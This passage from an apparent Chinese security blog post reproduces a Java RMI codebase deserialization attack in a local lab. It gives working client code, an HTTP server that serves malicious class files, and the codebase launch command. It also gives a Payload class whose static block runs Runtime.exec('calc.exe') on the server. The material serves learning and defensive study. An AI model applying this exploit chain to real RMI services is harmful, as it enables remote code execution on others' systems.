class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ICalc r = (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/refObj"</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ICalc</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICalc</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>目录结构如下<br><img src="https://i.loli.net/2021/11/11/3xKRs6FULtnYudA.png" alt="1.png"><br>这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才会去加载codebase中的类，所以不能将RMIClient.java放在RMI Server所在的目录中。<br>这里因为没有把文件放一块，所以补充了一下ICalc的接口定义<br>运行RMIClient：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -Djava.rmi.server.useCodeBaseOnly=false -Djava.rmi.server.codebase=http://domain/ RMIClient</span><br></pre></td></tr></table></figure>
+<p>在我本地复现的时候，报了一个这样的错误<br><img src="https://i.loli.net/2021/11/11/pWwn95vC6QJxq8H.png" alt="1.png"><br>这里提示找不到主类。不知道为啥。我把.java后缀加上，就好了，像这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -Djava.rmi.server.useCodeBaseOnly=false -Djava.rmi.server.codebase=http://domain/ RMIClient.java</span><br></pre></td></tr></table></figure>
+<p>这里需要把-Djava.rmi.server.codebase的地址设置为服务器的地址。先用dnslog测试下是否收到请求。<br>运行客户端时发现了报错。提示RMIClient$Payload找不到<br><img src="https://i.loli.net/2021/11/11/koRQ6hwF5YZfnea.png" alt="1.png"><br>查看dnslog，发现确实有请求<br><img src="https://i.loli.net/2021/11/11/81YEaLQqv9UDIBk.png" alt="1.png"></p>
+<p>这时，由于还没有放置恶意类在web服务器上，所以会抱一个value错误。web服务器会收到/RMIClient$Payload.class的请求。<br>只要编译恶意类并将其放置在web服务器的/RMIClient$Payload.class，即可在服务端反序列化这个类的时候触发任意代码执行。</p>
+<p>说做就做。在RMIClient的同文件夹下新建一个HttpServer文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpServer</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange httpExchange)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"new http request from "</span> + httpExchange.getRemoteAddress() + <span class="string">" "</span> + httpExchange.getRequestURI());</span><br><span class="line">            InputStream inputStream = HttpServer<span class="class">.<span class="keyword">class</span>.<span class="title">getResourceAsStream</span>(<span class="title">httpExchange</span>.<span class="title">getRequestURI</span>().<span class="title">getPath</span>())</span>;</span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">while</span> (inputStream.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8200</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"String HTTP Server on port: 8200"</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">"/"</span>, <span class="keyword">new</span> HttpServer());</span><br><span class="line">        httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>现在RMIClient的目录结构如下<br><img src="https://i.loli.net/2021/11/11/TlYbmfHyOkh8soL.png" alt="1.png"><br>运行HttpServer<br><img src="https://i.loli.net/2021/11/11/Am8vxTgXlRonF63.png" alt="1.png"><br>然后按照上面的步骤。运行RMIServer<br>最后运行RMIClient。codebase地址记得改为本地+8200端口<br>当按照流程启动文件后，观察HttpServer的访问请求。<br><img src="https://i.loli.net/2021/11/11/JoOg1MFE5yvZClY.png" alt="1.png"><br>发现请求了两个Class文件。<br>一个是RMIClient$Payload.class<br>另一个是RMIClient.class<br>并且此时客户端得到了计算结果7<br><img src="https://i.loli.net/2021/11/11/NrMO5xfaq1pXlKc.png" alt="1.png"><br>此时直接访问本地8200端口。发现有四个文件<br><img src="https://i.loli.net/2021/11/11/Az39ahBPcTVJbDQ.png" alt="1.png"><br>正好对应out目录下的四个class文件。</p>
+<p>这里我遇到一个坑。因为我想替换RMIClient$Payload.class为恶意的字节码文件<br>在我直接访问localhost:port发现他就是out目录下的class文件后。我尝试删掉了一些文件<br><img src="https://i.loli.net/2021/11/11/jZRwbJSnrLVkiQA.png" alt="1.png"><br>删掉文件后奖无法正常使用idea启动HttpServer，RMIClient等。当然，解决办法可以是直接利用javac编译一些java文件，然后把字节码文件复制过去。</p>
+<p>当我尝试新建一个恶意类文件Payload并且编译后将字节码文件替换到out目录下的字节码文件，然后重启服务端。再次用客户端请求时。报错了。<br>恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String sb = <span class="string">""</span>;</span><br><span class="line">        BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">            sb += lineStr + <span class="string">"\n"</span>;</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> sb;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String cmd=<span class="string">"calc"</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(exec(cmd));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将得到的Payload.class简单改名RMIClient$Payload.class并替换到out目录下<br>重启服务端，再用客户端访问。报错<br><img src="https://i.loli.net/2021/11/11/Z8zBGaRurH7lqiE.png" alt="1.png"></p>
+<p>这里猜测是类名和字节码的类名对不上。字节码里面类名是一个Payload。<br>尝试修改文件结构。<br>既然传递过去的对象是Payload对象，想到将Payload独立出来做一个单独的文件，然后在其中编写恶意代码<br>编译后将恶意的字节码文件放置在web服务器上。根据这个思路，修改文件结构。新增一个Payload文件，并修改RMIClient文件，其余不变动。<br>文件结构如下<br><img src="https://i.loli.net/2021/11/11/fibZDVAgU4P1Nop.png" alt="1.png"><br>RMIClient</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ICalc r = (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/refObj"</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java.io.Serializable;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">public class Payload extends ArrayList&lt;Integer&gt; implements Serializable  &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这就是src下的几个文件。</p>
+<p>另外，需要单独建立一个Payload文件。随便建立就可以，建立后用javac编译获取字节码。并在下面的操作中把Payload.class替换到web目录下<br>Payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; <span class="keyword">implements</span> <span class="title">Serializable</span>  </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String sb = <span class="string">""</span>;</span><br><span class="line">        BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line"></span><br><span class="line">        BufferedReader inBr;</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">for</span>(inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in)); (lineStr = inBr.readLine()) != <span class="keyword">null</span>; sb = sb + lineStr + <span class="string">"\n"</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> sb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"calc"</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(exec(cmd));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了Payload能传输，它需要继承Serializable接口。并且，Payload必须为<code>ArrayList&lt;Integer&gt;</code>的子类(也就是服务端接口所需参数的子类)<br>此时重启HttpServer。启动RMIServer。编译RMIClient目录下的文件。然后将之前准备的恶意的Payload.class替换到web目录下。随后启动RMIClient。<br>出现了一个错误。<br>stream classdesc serialVersionUID = -307374798435248844, local class serialVersionUID = -1127509434862035928<br>这个错误只需要设置一下 serialVersionUID即可解决。<br>手动修改。在恶意的Payload文件中增加这样一行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类定义中增加这个属性，数值根据报错的数值进行修改</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">307374798435248844L</span>;</span><br></pre></td></tr></table></figure>
+<p>随后再次编译Payload.java。将文件替换。再重启服务端，利用客户端做一次访问。<br><img src="https://i.loli.net/2021/11/12/ts2IlkYDHpaMS81.png" alt="1.png"><br>发现啥都没问题，但是没弹计算器。HttpServer这边收到了Payload.class的请求<br>前面对面反序列化数据说明应该是存在反序列化过程的。但是却没有触发构造函数。尝试修改Payload.java的内容。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; <span class="keyword">implements</span> <span class="title">Serializable</span>  </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">307374798435248844L</span>;</span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">"static test"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译后替换到web目录。重启服务端。然后重新启动客户端。HttpServer收到了Payload.class的请求。同时。服务端那边有了回显<br><img src="https://i.loli.net/2021/11/12/OU6fKy5Tshm7Nit.png" alt="1.png"><br>这里明显执行了静态代码块的代码。接下来想办法将恶意代码放置在静态代码块中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import java.io.Serializable;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Payload extends ArrayList&lt;Integer&gt; implements Serializable &#123;</span><br><span class="line">	private static final long serialVersionUID = -307374798435248844L;</span><br><span class="line">	static &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			System.out.println(&quot;static test&quot;);</span><br><span class="line">			Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br><span class="line">			</span><br><span class="line">		&#125; catch(Exception e) &#123;</span><br><span class="line">			System.out.println(&quot;catch error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一二三四。再来一次。还是那个流程<br>这一次成功弹出计算器。<br><img src="https://i.loli.net/2021/11/12/9ZvG1pO3Eihy57B.png" alt="1.png"><br>可以看到服务端先输出了static test。说明恶意代码在服务端执行成功。</p>
+<p>这里回答了之前两个问题的第一个</p>
+<ol>
+<li>这里思考两个问题，如果能访问RMI Registry，如何对其进行攻击？</li>
+<li>如果我们控制了目标RMI客户端中的Naming.lookup的第一个参数(也就是RMI Registry的地址)，能不能对服务端进行攻击？<br>那么第二个问题呢？其实原理都是一样的。如果控制了目标RMI客户端中的Naming.lookup，那么就可以去寻找指定名称<br>只要返回一个本地CLASSPATH不存在的类，让RMI客户端从codebase加载，最后也是会触发恶意代码执行。<br>所以说。RMIClient和RMIServer其实是可以互相攻击的。因为漏洞利用比较麻烦，这里先不做演示。后续复现的时候<br>会有攻击RMIClient的例子。</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/03/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87/" rel="next" title="java安全漫谈-反射篇">
+                <i class="fa fa-chevron-left"></i> java安全漫谈-反射篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">160.9k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
